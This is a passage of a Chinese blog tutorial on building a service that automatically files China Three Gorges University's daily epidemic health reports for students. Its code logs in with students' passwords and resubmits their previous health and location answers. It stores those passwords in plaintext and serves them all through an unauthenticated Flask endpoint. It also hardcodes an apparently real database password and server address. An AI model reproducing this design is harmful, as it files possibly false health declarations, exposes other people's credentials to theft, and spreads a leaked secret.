<p><img src="https://s2.loli.net/2022/02/15/lOJvXWRuxNEbnCs.png" alt=""></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Origin Headers</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'yiqing.ctgu.edu.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://yiqing.ctgu.edu.cn/wx/index/main.do?currSchool=ctgu&amp;CURRENT_YEAR=2019&amp;showWjdc=false&amp;studentShowWjdc=false'</span><span class="token punctuation">,</span>
    <span class="token comment"># 'Upgrade-Insecure-Requests': '1',</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 获取服务器端 JSESSIONID</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session_url <span class="token operator">=</span> <span class="token string">'http://yiqing.ctgu.edu.cn/wx/health/main.do'</span>
response_session <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>session_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># post data</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
    <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 模拟登录请求，进行 JSESSIONID 账号配对</span>
login_url <span class="token operator">=</span> <span class="token string">'http://yiqing.ctgu.edu.cn/wx/index/loginSubmit.do'</span>
response_data <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>login_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'登录状态: '</span> <span class="token operator">+</span> response_data<span class="token punctuation">)</span></code></pre>
<p>登录成功返回success，失败返回false。后续我们可以通过该接口返回值对有效用户进行筛选。接下来我们利用该session请求提交页面拿到隐藏的token</p>
<p><img src="https://s2.loli.net/2022/02/15/IjUKrvb13AF2YiD.png" alt=""></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Get token</span>
apply_url <span class="token operator">=</span> <span class="token string">'http://yiqing.ctgu.edu.cn/wx/health/toApply.do'</span>
apply_response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>apply_url<span class="token punctuation">)</span><span class="token punctuation">.</span>text

<span class="token comment"># 判断是否已提交请求，如果已经提交的话服务器便不再响应</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" name="ttoken" value="(.*?)"/>'</span><span class="token punctuation">,</span> apply_response<span class="token punctuation">)</span><span class="token punctuation">:</span>
token <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" name="ttoken" value="(.*?)"/>'</span><span class="token punctuation">,</span> apply_response<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># 获取上一次提交数据进行构造请求</span>
before_url <span class="token operator">=</span> <span class="token string">'http://yiqing.ctgu.edu.cn/wx/health/studentHis.do'</span>
before_data <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>before_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
before_data_json <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>before_data<span class="token punctuation">)</span>

<span class="token comment"># 构造提交参数</span>
data_submit <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token string">'ttoken'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>
<span class="token string">'province'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'province'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'city'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'city'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'district'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'district'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'adcode'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'adcode'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'longitude'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'longitude'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'latitude'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'latitude'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sfqz'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sfqz'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sfys'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sfys'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sfzy'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sfzy'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sfgl'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sfgl'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'status'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'szdz'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'szdz'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sjh'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sjh'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'lxrxm'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lxrxm'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'lxrsjh'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lxrsjh'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sffr'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sffr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sffrAm'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sffrAm'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sffrNoon'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sffrNoon'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sffrPm'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sffrPm'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sffy'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sffy'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sfgr'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sfgr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'qzglsj'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'qzglsj'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'qzgldd'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'qzgldd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'glyy'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'glyy'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'mqzz'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'mqzz'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'sffx'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sffx'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'qt'</span><span class="token punctuation">:</span> before_data_json<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'qt'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>找到最后提交的URL进行请求即可</p>
<p><img src="https://s2.loli.net/2022/02/15/5x2f1q9jyeaA3mz.png" alt=""></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Final Submit API</span>
url <span class="token operator">=</span> <span class="token string">'http://yiqing.ctgu.edu.cn/wx/health/saveApply.do'</span>
submit <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data_submit<span class="token punctuation">)</span><span class="token punctuation">.</span>text
submit_json <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>submit<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'提交状态：'</span> <span class="token operator">+</span> submit_json<span class="token punctuation">[</span><span class="token string">'msgStatus'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
<h3 id="对接MySQL数据库">对接MySQL数据库</h3>
<p>利用pymysql库将数据库信息拉到本地遍历请求即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token comment"># Connect MySQL</span>
    connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'IP地址'</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'数据库用户'</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span><span class="token string">'数据库密码'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token string">'数据库名称'</span><span class="token punctuation">,</span> charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
    cursor <span class="token operator">=</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Get user and password</span>
    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select * from yiqing'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 收集所有用户信息</span>
    user_information <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Disconnect MySQL</span>
    connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    ErrorLog<span class="token punctuation">(</span><span class="token string">'Error---MySQL'</span><span class="token punctuation">)</span></code></pre>
<h2 id="后端提供API接口">后端提供API接口</h2>
<h3 id="利用Flask搭建接口">利用Flask搭建接口</h3>
<p>Flask本身不限定数据库的选择，你可以选择SQL或NOSQL的任何一种。也可以选择更方便的SQLALchemy，类似于Django的ORM。SQLALchemy实际上是对数据库的抽象，让开发者不用直接和SQL语句打交道，而是通过Python对象来操作数据库，在舍弃一些性能开销的同时，换来的是开发效率的较大提升。</p>
<p>SQLAlchemy是一个关系型数据库框架，它提供了高层的ORM和底层的原生数据库的操作。<a href="https://flask-sqlalchemy.palletsprojects.com/en/master/quickstart/">Flask-SQLAlchemy</a>是一个简化了SQLAlchemy操作的flask扩展。</p>
<p>新建api.py文件</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'./../../flask-dist'</span><span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'./../../flask-dist'</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_DATABASE_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'mysql+pymysql://name:pwd@106.13.174.205:3306/mls_web'</span>
<span class="token comment"># mysql+pymysql 这是声明数据库和链接数据库的引擎  </span>
<span class="token comment"># name pwd 就是可以访问数据库的用户名密码 </span>
<span class="token comment"># 106.13.174.205:3306 是数据库地址 </span>
<span class="token comment"># /mls_web 这是数据库名字</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>  
 如果设置成 <span class="token boolean">True</span> <span class="token punctuation">(</span>默认情况<span class="token punctuation">)</span>，Flask<span class="token operator">-</span>SQLAlchemy 将会追踪对象的修改并且发送信号。这需要额外的内存， 如果不必要的可以禁用它。
 
db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
声明数据对象

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p>安装包</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> sqlacodegen</code></pre>
<p>cmd 切换到 flask目录 执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sqlacodegen --outfile<span class="token operator">=</span>models.py mysql+pymysql://name:pwd@106.13.174.205:3306/mls_web</code></pre>
<p>生成一个models.py文件 user表的映射，在该文件中，如果需要json格式传递，在class中添加如下代码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">to_json</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
       <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
           <span class="token string">'id'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span>
           <span class="token string">'name'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
           <span class="token string">'pwd'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>pwd
       <span class="token punctuation">&#125;</span></code></pre>
<p>将model.py引入api.py中</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> request
<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy
<span class="token keyword">from</span> models <span class="token keyword">import</span> <span class="token operator">*</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'./../../flask-dist'</span><span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'./../../flask-dist'</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_DATABASE_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'mysql+pymysql://mls:a838502774@106.13.174.205:3306/mls_web'</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_UCSO'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>

db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUser'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># 查询数据的接口</span>
<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>				<span class="token comment">#User是从models里导入的 </span>
    temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> res<span class="token punctuation">:</span>
        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">.</span>to_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>data<span class="token operator">=</span>temp<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/addUser'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#新增数据的接口</span>
<span class="token keyword">def</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json        <span class="token comment">#获取传过来的参数</span>
    u <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pwd<span class="token operator">=</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#根据传过来参数创建一条数据</span>
    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>u<span class="token punctuation">)</span>  <span class="token comment">#add 是增加数据</span>
    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#提交了才会到数据库中</span>
    <span class="token keyword">return</span> <span class="token string">'success'</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<h3 id="Flask解决跨域问题">Flask解决跨域问题</h3>
<pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> flask-cors</code></pre>
<p>flask-cors 有两种用法，一种为全局使用，一种对指定的路由使用</p>
<p>配置全局路由</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
CORS<span class="token punctuation">(</span>app<span class="token punctuation">,</span> supports_credentials<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p>配置单行路由</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> cross_origin

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@cross_origin</span><span class="token punctuation">(</span>supports_credentials<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"World"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">!'</span></span>
</code></pre>
<h3 id="服务器后台挂起">服务器后台挂起</h3>
<p>到这里接口已经可以正常访问了，但是当程序退出时无法访问，这里我使用gunicorn将flask挂起到后台</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装最新版本的gunicorn</span>
pip <span class="token function">install</span> gunicorn
<span class="token comment">#安装指定版本的gunicorn</span>
pip <span class="token function">install</span> <span class="token assign-left variable">gunicorn</span><span class="token operator">==</span><span class="token number">19.9</span>.0
<span class="token comment">#异步模式</span>
pip <span class="token function">install</span> <span class="token assign-left variable">gevent</span><span class="token operator">==</span><span class="token number">1.4</span>.0</code></pre>
<p>定义常用的配置文件</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!usr/bin/env python</span>
<span class="token comment">#encoding:utf-8</span>
 
 
<span class="token keyword">import</span> os
<span class="token keyword">import</span> gevent<span class="token punctuation">.</span>monkey
gevent<span class="token punctuation">.</span>monkey<span class="token punctuation">.</span>patch_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">import</span> multiprocessing
 
 
<span class="token comment">#开发环境可以打开，生产环境可以</span>
<span class="token comment">#debug = True  </span>
 
<span class="token comment">#用于控制errorlog的信息级别，可以设置为debug、info、warning、error、critical</span>
loglevel <span class="token operator">=</span> <span class="token string">'debug'</span>
 
<span class="token comment">#监听地址+端口</span>
bind <span class="token operator">=</span> <span class="token string">"0.0.0.0:5000"</span>
 
<span class="token comment">#定义日志存储</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'log/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token string">'log/'</span><span class="token punctuation">)</span>
pidfile <span class="token operator">=</span> <span class="token string">"log/gunicorn.pid"</span>
<span class="token comment">#访问日志</span>
accesslog <span class="token operator">=</span> <span class="token string">"log/access.log"</span>
<span class="token comment">#错误日志</span>
errorlog <span class="token operator">=</span> <span class="token string">"log/debug.log"</span>
 
<span class="token comment">#开启后台运行，默认值为False</span>
daemon <span class="token operator">=</span> <span class="token boolean">True</span>
 
<span class="token comment">#启动的进程数，推荐值为：CPU核数*2+1</span>
workers <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span>
 
<span class="token comment">#指开启的每个工作进程的模式类型，默认为sync模式，也可使用gevent模式</span>
worker_class <span class="token operator">=</span> <span class="token string">'gevent'</span>
x_forwarded_for_header <span class="token operator">=</span> <span class="token string">'X-FORWARDED-FOR'</span></code></pre>
<p>启动方式</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 第一种</span>
gunicorn -w <span class="token number">4</span> -b <span class="token number">172.19</span>.6.213:5000 api:app
<span class="token comment"># 第二种</span>
gunicorn --config<span class="token operator">=</span>config.py api:app</code></pre>
<p>如果出现占用情况，可先查看pid然后关停即可</p>
<pre class="language-none"><code class="language-none">netstat -tulpn</code></pre>
<p>4096即为占位端口的pid</p>
<pre class="language-none"><code class="language-none">kill -9 4096</code></pre>
<h2 id="前端用户信息收集">前端用户信息收集</h2>
<p>因为仅仅是收集用户的学号和密码，故不需要router以及vuex等组件，也不需要对axios进行二次封装，所以这里我采用ElementUI的一个表单组件。再通过对样式进行微调，为了放置页面过于单调，为其添加一个SVG的动态背景。</p>
<p>本地调试的时候由于可以通过后端解决跨域问题，便不再对vue.config.js进行更改，不过需要注意的是要在里面更改页面title</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// vue.config.js</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//关闭es6</span>
  lintOnSave<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token function-variable function">chainWebpack</span><span class="token operator">:</span> <span class="token parameter">config</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    config
      <span class="token punctuation">.</span><span class="token function">plugin</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">tap</span><span class="token punctuation">(</span><span class="token parameter">args</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'CTGU自动安全上报'</span>
        <span class="token keyword">return</span> args
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
